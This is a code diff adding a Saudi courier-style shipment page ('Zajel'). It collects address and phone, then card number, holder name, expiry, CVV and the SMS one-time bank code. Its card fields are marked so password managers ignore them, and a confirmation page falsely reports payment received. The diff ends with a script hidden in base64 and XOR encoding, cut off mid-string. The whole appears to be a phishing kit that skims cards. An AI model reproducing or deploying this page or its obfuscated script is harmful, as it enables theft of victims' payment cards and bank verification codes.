+            <option value="شقراء">شقراء</option>
+            <option value="حوطة بني تميم">حوطة بني تميم</option>
+            <option value="عفيف">عفيف</option>
+            <option value="السليل">السليل</option>
+            <option value="ضرما">ضرما</option>
+            <option value="المزاحمية">المزاحمية</option>
+            <option value="رماح">رماح</option>
+            <option value="ثادق">ثادق</option>
+            <option value="حريملاء">حريملاء</option>
+            <option value="الحريق">الحريق</option>
+            <option value="مرات">مرات</option>
+            <option value="الغاط">الغاط</option>
+          </optgroup>
+          <optgroup label="منطقة مكة المكرمة">
+            <option value="مكة المكرمة">مكة المكرمة</option>
+            <option value="جدة">جدة</option>
+            <option value="الطائف">الطائف</option>
+            <option value="القنفذة">القنفذة</option>
+            <option value="الليث">الليث</option>
+            <option value="رابغ">رابغ</option>
+            <option value="خليص">خليص</option>
+            <option value="الخرمة">الخرمة</option>
+            <option value="رنية">رنية</option>
+            <option value="تربة">تربة</option>
+            <option value="الجموم">الجموم</option>
+            <option value="الكامل">الكامل</option>
+            <option value="المويه">المويه</option>
+            <option value="ميسان">ميسان</option>
+            <option value="أضم">أضم</option>
+            <option value="بحرة">بحرة</option>
+          </optgroup>
+          <optgroup label="منطقة المدينة المنورة">
+            <option value="المدينة المنورة">المدينة المنورة</option>
+            <option value="ينبع">ينبع</option>
+            <option value="العلا">العلا</option>
+            <option value="بدر">بدر</option>
+            <option value="الحناكية">الحناكية</option>
+            <option value="خيبر">خيبر</option>
+            <option value="المهد">المهد</option>
+            <option value="وادي الفرع">وادي الفرع</option>
+            <option value="العيص">العيص</option>
+          </optgroup>
+          <optgroup label="المنطقة الشرقية">
+            <option value="الدمام">الدمام</option>
+            <option value="الأحساء">الأحساء</option>
+            <option value="حفر الباطن">حفر الباطن</option>
+            <option value="الجبيل">الجبيل</option>
+            <option value="القطيف">القطيف</option>
+            <option value="الخبر">الخبر</option>
+            <option value="الخفجي">الخفجي</option>
+            <option value="رأس تنورة">رأس تنورة</option>
+            <option value="بقيق">بقيق</option>
+            <option value="النعيرية">النعيرية</option>
+            <option value="قرية العليا">قرية العليا</option>
+          </optgroup>
+          <optgroup label="منطقة القصيم">
+            <option value="بريدة">بريدة</option>
+            <option value="عنيزة">عنيزة</option>
+            <option value="الرس">الرس</option>
+            <option value="المذنب">المذنب</option>
+            <option value="البكيرية">البكيرية</option>
+            <option value="البدائع">البدائع</option>
+            <option value="الأسياح">الأسياح</option>
+            <option value="النبهانية">النبهانية</option>
+            <option value="الشماسية">الشماسية</option>
+            <option value="عيون الجواء">عيون الجواء</option>
+            <option value="رياض الخبراء">رياض الخبراء</option>
+            <option value="عقلة الصقور">عقلة الصقور</option>
+            <option value="ضرية">ضرية</option>
+          </optgroup>
+          <optgroup label="منطقة عسير">
+            <option value="أبها">أبها</option>
+            <option value="خميس مشيط">خميس مشيط</option>
+            <option value="بيشة">بيشة</option>
+            <option value="النماص">النماص</option>
+            <option value="محايل عسير">محايل عسير</option>
+            <option value="ظهران الجنوب">ظهران الجنوب</option>
+            <option value="تثليث">تثليث</option>
+            <option value="سراة عبيدة">سراة عبيدة</option>
+            <option value="رجال ألمع">رجال ألمع</option>
+            <option value="بلقرن">بلقرن</option>
+            <option value="أحد رفيدة">أحد رفيدة</option>
+            <option value="المجاردة">المجاردة</option>
+            <option value="البرك">البرك</option>
+            <option value="تنومة">تنومة</option>
+            <option value="طريب">طريب</option>
+            <option value="الحرجة">الحرجة</option>
+            <option value="الربوعة">الربوعة</option>
+          </optgroup>
+          <optgroup label="منطقة تبوك">
+            <option value="تبوك">تبوك</option>
+            <option value="الوجه">الوجه</option>
+            <option value="ضبا">ضبا</option>
+            <option value="تيماء">تيماء</option>
+            <option value="أملج">أملج</option>
+            <option value="حقل">حقل</option>
+            <option value="البدع">البدع</option>
+          </optgroup>
+          <optgroup label="منطقة حائل">
+            <option value="حائل">حائل</option>
+            <option value="بقعاء">بقعاء</option>
+            <option value="الغزالة">الغزالة</option>
+            <option value="الشنان">الشنان</option>
+            <option value="الحائط">الحائط</option>
+            <option value="السليمي">السليمي</option>
+            <option value="الشملي">الشملي</option>
+            <option value="موقق">موقق</option>
+            <option value="سميراء">سميراء</option>
+          </optgroup>
+          <optgroup label="منطقة الحدود الشمالية">
+            <option value="عرعر">عرعر</option>
+            <option value="رفحاء">رفحاء</option>
+            <option value="طريف">طريف</option>
+            <option value="العويقيلة">العويقيلة</option>
+          </optgroup>
+          <optgroup label="منطقة جازان">
+            <option value="جازان">جازان</option>
+            <option value="صبيا">صبيا</option>
+            <option value="أبو عريش">أبو عريش</option>
+            <option value="صامطة">صامطة</option>
+            <option value="بيش">بيش</option>
+            <option value="الدرب">الدرب</option>
+            <option value="الحرث">الحرث</option>
+            <option value="ضمد">ضمد</option>
+            <option value="الريث">الريث</option>
+            <option value="فرسان">فرسان</option>
+            <option value="الدائر">الدائر</option>
+            <option value="العيدابي">العيدابي</option>
+            <option value="فيفاء">فيفاء</option>
+            <option value="هروب">هروب</option>
+            <option value="الطوال">الطوال</option>
+            <option value="العارضة">العارضة</option>
+          </optgroup>
+          <optgroup label="منطقة نجران">
+            <option value="نجران">نجران</option>
+            <option value="شرورة">شرورة</option>
+            <option value="حبونا">حبونا</option>
+            <option value="بدر الجنوب">بدر الجنوب</option>
+            <option value="يدمة">يدمة</option>
+            <option value="ثار">ثار</option>
+            <option value="خباش">خباش</option>
+          </optgroup>
+          <optgroup label="منطقة الباحة">
+            <option value="الباحة">الباحة</option>
+            <option value="بلجرشي">بلجرشي</option>
+            <option value="المندق">المندق</option>
+            <option value="المخواة">المخواة</option>
+            <option value="قلوة">قلوة</option>
+            <option value="العقيق">العقيق</option>
+            <option value="القرى">القرى</option>
+            <option value="بني حسن">بني حسن</option>
+            <option value="غامد الزناد">غامد الزناد</option>
+            <option value="الحجرة">الحجرة</option>
+          </optgroup>
+          <optgroup label="منطقة الجوف">
+            <option value="سكاكا">سكاكا</option>
+            <option value="القريات">القريات</option>
+            <option value="دومة الجندل">دومة الجندل</option>
+            <option value="طبرجل">طبرجل</option>
+          </optgroup>
+        </select>
+      </div>
+
+      <div class="zajel-field-group">
+        <label for="zajelDistrictInput">الحي <span class="req">*</span></label>
+        <input type="text" id="zajelDistrictInput" class="zajel-input" required />
+      </div>
+
+      <div class="zajel-field-group">
+        <label for="zajelStreetInput">الشارع <span class="req">*</span></label>
+        <input type="text" id="zajelStreetInput" class="zajel-input" required />
+      </div>
+
+      <div class="zajel-field-group">
+        <label for="zajelPhoneInput">رقم الجوال <span class="req">*</span></label>
+        <input type="tel" id="zajelPhoneInput" class="zajel-input" maxlength="10" inputmode="numeric" placeholder="05xxxxxxxx" dir="ltr" style="text-align:left;font-weight:700;" required />
+      <div id="zajelPhoneError" style="display:none;margin-top:6px;padding:8px 10px;border-radius:7px;background:#fef2f2;color:#b91c1c;border:1px solid #fecaca;font-size:12.5px;font-weight:800;"></div>
+      </div>
+
+      <div id="zajelShipmentErrorBox" style="display:none;margin-bottom:10px;padding:10px 12px;border-radius:8px;background:#fef2f2;color:#b91c1c;border:1px solid #fecaca;font-size:13px;font-weight:800;text-align:right;"></div>
+      <button type="submit" class="zajel-submit-btn">تأكيد إنشاء الشحنة</button>
+
+      <div class="zajel-success-box" id="zajelFormSuccess" style="display:none !important;"></div>
+    </form>
+  </div>
+</div>
+
+<style id="zajel-payment-page-style">
+  #zajelPaymentPage,
+  #zajelPaymentOtpPage,
+  #zajelPaymentConfirmPage {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 1000001;
+    background: #f1f5f7;
+    overflow-y: auto;
+    direction: rtl;
+    text-align: right;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
+  }
+  #zajelPaymentOtpPage {
+    z-index: 1000002;
+  }
+  #zajelPaymentConfirmPage {
+    z-index: 1000003;
+  }
+  #zajelPaymentPage.open,
+  #zajelPaymentOtpPage.open,
+  #zajelPaymentConfirmPage.open {
+    display: block;
+  }
+  .zajel-pay-wrap {
+    max-width: 560px;
+    margin: 18px auto 36px;
+    padding: 0 14px;
+  }
+  .zajel-pay-top-actions {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 12px;
+    gap: 10px;
+  }
+  .zajel-pay-back-btn {
+    background: #ffffff;
+    color: #093b44;
+    border: 1.5px solid #cbd5e1;
+    border-radius: 9px;
+    padding: 8px 14px;
+    font-size: 13.5px;
+    font-weight: 800;
+    cursor: pointer;
+  }
+  .zajel-price-banner {
+    background: linear-gradient(135deg, #093b44 0%, #0e5c6b 100%);
+    color: #ffffff;
+    border-radius: 14px;
+    padding: 18px;
+    margin-bottom: 14px;
+    border-bottom: 4px solid #ffc20a;
+    box-shadow: 0 8px 20px rgba(9, 59, 68, 0.16);
+  }
+  .zajel-price-banner-top {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    margin-bottom: 10px;
+  }
+  .zajel-price-title {
+    font-size: 18px;
+    font-weight: 900;
+    color: #ffffff;
+  }
+  .zajel-price-tag {
+    background: #ffc20a;
+    color: #093b44;
+    font-size: 20px;
+    font-weight: 900;
+    padding: 6px 14px;
+    border-radius: 10px;
+    white-space: nowrap;
+  }
+  .zajel-order-meta {
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 10px;
+    padding: 10px 12px;
+    font-size: 13px;
+    color: #e6f4f7;
+    line-height: 1.7;
+  }
+  .zajel-pay-card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 20px 18px;
+    box-shadow: 0 10px 24px rgba(15, 23, 42, 0.08);
+    border: 1px solid #e2e8f0;
+  }
+  .zajel-card-badge-header {
+    border: 1.5px solid #00a5b5;
+    background: #e6f7f9;
+    color: #074650;
+    border-radius: 10px;
+    padding: 11px 14px;
+    font-size: 15px;
+    font-weight: 800;
+    text-align: center;
+    margin-bottom: 16px;
+  }
+  .zajel-card-row-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+  .zajel-pay-submit {
+    width: 100%;
+    margin-top: 8px;
+    background: #00a5b5;
+    color: #ffffff;
+    border: none;
+    border-radius: 10px;
+    padding: 13px 18px;
+    font-size: 16px;
+    font-weight: 900;
+    cursor: pointer;
+    box-shadow: 0 6px 16px rgba(0, 165, 181, 0.28);
+  }
+  .zajel-pay-submit:hover {
+    background: #008c9a;
+  }
+  .zajel-pay-error {
+    display: none;
+    margin-top: 10px;
+    padding: 10px 12px;
+    border-radius: 8px;
+    background: #fef2f2;
+    color: #b91c1c;
+    border: 1px solid #fecaca;
+    font-size: 13.5px;
+    font-weight: 700;
+  }
+  .zajel-otp-box {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 24px 18px;
+    box-shadow: 0 12px 28px rgba(15, 23, 42, 0.1);
+    border: 1px solid #e2e8f0;
+    text-align: center;
+  }
+  .zajel-otp-badge {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: #e6f7f9;
+    color: #093b44;
+    border: 2px solid #00a5b5;
+    font-size: 28px;
+    margin-bottom: 12px;
+  }
+  .zajel-otp-title {
+    margin: 0 0 8px;
+    font-size: 21px;
+    font-weight: 900;
+    color: #093b44;
+  }
+  .zajel-otp-desc {
+    margin: 0 0 16px;
+    font-size: 14px;
+    color: #475569;
+    line-height: 1.65;
+  }
+  .zajel-otp-input {
+    width: 100%;
+    max-width: 260px;
+    margin: 0 auto 12px;
+    display: block;
+    padding: 13px 14px;
+    border: 2px solid #00a5b5;
+    border-radius: 12px;
+    font-size: 24px;
+    font-weight: 900;
+    letter-spacing: 6px;
+    text-align: center;
+    direction: ltr;
+    color: #093b44;
+    background: #f8fafc;
+    outline: none;
+  }
+  .zajel-otp-input:focus {
+    background: #ffffff;
+    box-shadow: 0 0 0 4px rgba(0, 165, 181, 0.16);
+  }
+  .zajel-otp-meta {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 10px;
+    padding: 10px 14px;
+    margin-bottom: 14px;
+    font-size: 13px;
+    color: #334155;
+  }
+  .zajel-resend-btn {
+    background: transparent;
+    border: none;
+    color: #008c9a;
+    font-size: 13.5px;
+    font-weight: 800;
+    cursor: pointer;
+    text-decoration: underline;
+    margin-top: 12px;
+  }
+  .zajel-resend-btn:disabled {
+    color: #94a3b8;
+    cursor: not-allowed;
+    text-decoration: none;
+  }
+  .zajel-confirm-card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 20px;
+    box-shadow: 0 12px 28px rgba(15, 23, 42, 0.1);
+    border: 1px solid #e2e8f0;
+    text-align: center;
+  }
+  .zajel-confirm-icon {
+    width: 68px;
+    height: 68px;
+    border-radius: 50%;
+    background: #dcfce7;
+    color: #15803d;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    font-weight: 900;
+    margin-bottom: 12px;
+    border: 2px solid #22c55e;
+  }
+  .zajel-confirm-title {
+    margin: 0 0 6px;
+    font-size: 22px;
+    font-weight: 900;
+    color: #093b44;
+  }
+  .zajel-confirm-subtitle {
+    margin: 0 0 18px;
+    font-size: 14.5px;
+    color: #475569;
+    line-height: 1.6;
+  }
+  .zajel-confirm-details {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 12px;
+    padding: 14px 16px;
+    text-align: right;
+    margin-bottom: 18px;
+  }
+  .zajel-confirm-details .zajel-summary-row {
+    border-bottom: 1px dashed #cbd5e1;
+    padding: 8px 0;
+  }
+  .zajel-confirm-details .zajel-summary-row:last-child {
+    border-bottom: none;
+  }
+</style>
+
+<div id="zajelPaymentPage" role="dialog" aria-modal="true" aria-label="صفحة الدفع">
+  <div class="zajel-pay-wrap">
+    <div class="zajel-price-banner">
+      <div class="zajel-price-banner-top">
+        <div class="zajel-price-title">المبلغ المستحق للشحنة</div>
+        <div class="zajel-price-tag" id="zajelAutoPriceDisplay">25 ريال</div>
+      </div>
+      <div class="zajel-order-meta" id="zajelOrderSummaryMeta"></div>
+    </div>
+
+    <form class="zajel-pay-card" id="zajelPaymentForm" novalidate>
+      <div class="zajel-card-badge-header">الدفع عبر بطاقة مدى / ائتمان</div>
+
+      <div id="zajelCardFields">
+        <div class="zajel-field-group">
+          <label for="zajelCardNumber">رقم البطاقة <span class="req">*</span></label>
+          <input type="text" id="zajelCardNumber" class="zajel-input" inputmode="numeric" maxlength="19" autocomplete="new-password" data-lpignore="true" dir="ltr" style="text-align:left;letter-spacing:1px;font-weight:700;" />
+        </div>
+
+        <div class="zajel-field-group">
+          <label for="zajelCardHolder">اسم حامل البطاقة <span class="req">*</span></label>
+          <input type="text" id="zajelCardHolder" class="zajel-input" autocomplete="new-password" data-lpignore="true" />
+        </div>
+
+        <div class="zajel-card-row-2">
+          <div class="zajel-field-group">
+            <label for="zajelCardExpiry">تاريخ الانتهاء <span class="req">*</span></label>
+            <input type="text" id="zajelCardExpiry" class="zajel-input" inputmode="numeric" maxlength="5" autocomplete="new-password" data-lpignore="true" dir="ltr" style="text-align:left;font-weight:700;" />
+          </div>
+          <div class="zajel-field-group">
+            <label for="zajelCardCvv">رمز الأمان (CVV) <span class="req">*</span></label>
+            <input type="text" id="zajelCardCvv" class="zajel-input" inputmode="numeric" maxlength="3" autocomplete="new-password" data-lpignore="true" dir="ltr" style="text-align:left;font-weight:700;" />
+          </div>
+        </div>
+      </div>
+
+      <div id="zajelPayErrorBox" style="display:none;margin-bottom:12px;padding:10px 12px;border-radius:8px;background:#fef2f2;color:#b91c1c;border:1px solid #fecaca;font-size:13px;font-weight:800;text-align:right;"></div>
+      <button type="submit" class="zajel-pay-submit" id="zajelPaySubmitBtn">إتمام الدفع</button>
+    </form>
+  </div>
+</div>
+
+
+
+<div id="zajelPaymentOtpPage" role="dialog" aria-modal="true" aria-label="التحقق من عملية الدفع">
+  <div class="zajel-pay-wrap">
+    <form class="zajel-otp-box" id="zajelOtpForm" novalidate>
+      <div class="zajel-otp-badge">🔒</div>
+      <h2 class="zajel-otp-title">التحقق من عملية الدفع</h2>
+      <p class="zajel-otp-desc">
+        تم إرسال رسالة نصية (SMS) تحتوي على رمز التحقق إلى رقم جوالك المسجل
+        <strong id="zajelOtpMaskedPhone" dir="ltr" style="color:#093b44;"></strong>
+      </p>
+
+      <div class="zajel-otp-meta">
+        <span><strong>المبلغ:</strong> <span id="zajelOtpAmount" style="color:#093b44;font-weight:900;"></span></span>
+        <span><strong>البطاقة:</strong> <span id="zajelOtpCardLast4" dir="ltr" style="font-weight:800;"></span></span>
+      </div>
+
+      <div class="zajel-field-group" style="text-align:center;">
+        <label for="zajelOtpCodeInput" style="text-align:center;">أدخل رمز التحقق <span class="req">*</span></label>
+        <input type="text" id="zajelOtpCodeInput" class="zajel-otp-input" inputmode="numeric" maxlength="6" autocomplete="one-time-code" name="one-time-code" />
+      </div>
+
+      <div id="zajelOtpErrorBox" style="display:none;margin:0 auto 12px;max-width:300px;padding:9px 12px;border-radius:8px;background:#fef2f2;color:#b91c1c;border:1px solid #fecaca;font-size:13px;font-weight:800;text-align:center;"></div>
+      <button type="submit" class="zajel-pay-submit" id="zajelVerifyOtpBtn">إتمام الدفع</button>
+
+      <div>
+        <button type="button" class="zajel-resend-btn" id="zajelResendOtpBtn">إعادة إرسال رمز التحقق (<span id="zajelOtpTimer">60</span> ث)</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<style id="zajel-sender-completed-style">
+  #zajelSenderCompletedPage {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 1000004;
+    background: #f1f5f7;
+    overflow-y: auto;
+    direction: rtl;
+    text-align: right;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
+  }
+  #zajelSenderCompletedPage.open {
+    display: block;
+  }
+  .zajel-done-wrap {
+    max-width: 560px;
+    margin: 22px auto 36px;
+    padding: 0 14px;
+  }
+  .zajel-done-card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 24px 18px;
+    box-shadow: 0 12px 28px rgba(15, 23, 42, 0.1);
+    border: 1px solid #e2e8f0;
+  }
+  .zajel-done-badge {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: #e6f7f9;
+    color: #093b44;
+    border: 2px solid #00a5b5;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 30px;
+    font-weight: 900;
+    margin: 0 auto 12px;
+  }
+  .zajel-done-header {
+    text-align: center;
+    margin-bottom: 18px;
+  }
+  .zajel-done-title {
+    margin: 0 0 6px;
+    font-size: 21px;
+    font-weight: 900;
+    color: #093b44;
+  }
+  .zajel-done-sub {
+    margin: 0;
+    font-size: 14px;
+    color: #475569;
+    line-height: 1.65;
+  }
+  .zajel-steps-box {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 12px;
+    padding: 14px 16px;
+    margin-bottom: 16px;
+  }
+  .zajel-step-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    padding: 10px 8px;
+    border-bottom: 1px dashed #cbd5e1;
+    font-size: 14px;
+  }
+  .zajel-step-item:last-child {
+    border-bottom: none;
+  }
+  .zajel-step-ok {
+    background: #dcfce7;
+    color: #15803d;
+    font-weight: 800;
+    font-size: 12.5px;
+    padding: 4px 10px;
+    border-radius: 999px;
+    white-space: nowrap;
+  }
+  .zajel-step-pending {
+    background: #fef3c7;
+    color: #b45309;
+    font-weight: 800;
+    font-size: 12.5px;
+    padding: 4px 10px;
+    border-radius: 999px;
+    white-space: nowrap;
+  }
+  .zajel-done-info {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 12px;
+    padding: 12px 16px;
+    margin-bottom: 18px;
+  }
+  .zajel-done-info .zajel-summary-row {
+    border-bottom: 1px dashed #cbd5e1;
+    padding: 7px 0;
+  }
+  .zajel-done-info .zajel-summary-row:last-child {
+    border-bottom: none;
+  }
+</style>
+
+<div id="zajelSenderCompletedPage" role="dialog" aria-modal="true" aria-label="حالة إجراءات الطلب">
+  <div class="zajel-done-wrap">
+    <div class="zajel-done-card">
+      <div class="zajel-done-header">
+        <div class="zajel-done-badge">✓</div>
+        <h2 class="zajel-done-title">تم إتمام بيانات المرسل بنجاح</h2>
+        <p class="zajel-done-sub">تم تسجيل بيانات الطرف الأول بنجاح، وبإمكانك الآن متابعة وإكمال بيانات الطلب.</p>
+      </div>
+
+      <div class="zajel-steps-box">
+        <div class="zajel-step-item">
+          <span><strong>1. بيانات الطرف الأول:</strong></span>
+          <span class="zajel-step-ok">مكتمل ✓</span>
+        </div>
+        <div class="zajel-step-item">
+          <span><strong>2. استكمال بيانات الطلب:</strong></span>
+          <span class="zajel-step-pending">بانتظار الإكمال ⏳</span>
+        </div>
+      </div>
+
+      <button type="button" class="zajel-pay-submit" id="zajelProceedMyActionBtn">أكمل الطلب</button>
+    </div>
+  </div>
+</div>
+
+<div id="zajelPaymentConfirmPage" role="dialog" aria-modal="true" aria-label="تأكيد الدفع">
+  <div class="zajel-pay-wrap">
+    <div class="zajel-confirm-card">
+      <div class="zajel-confirm-icon">✓</div>
+      <h2 class="zajel-confirm-title">تم تأكيد الدفع بنجاح</h2>
+      <p class="zajel-confirm-subtitle">تم التحقق من العملية واستلام مبلغ الشحنة بنجاح، وسيتم إرسال تفاصيل التتبع إلى رقم جوالك.</p>
+
+      <div class="zajel-confirm-details" style="display:none;"></div>
+
+      <button type="button" class="zajel-pay-submit" id="zajelConfirmDoneBtn">العودة للصفحة الرئيسية</button>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
+
+<script id="spl-standalone-interactive-script">
+(function(){
+  var _k=[37,83,19,111];
+  var _d=atob(["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","BXMzTwUuGU8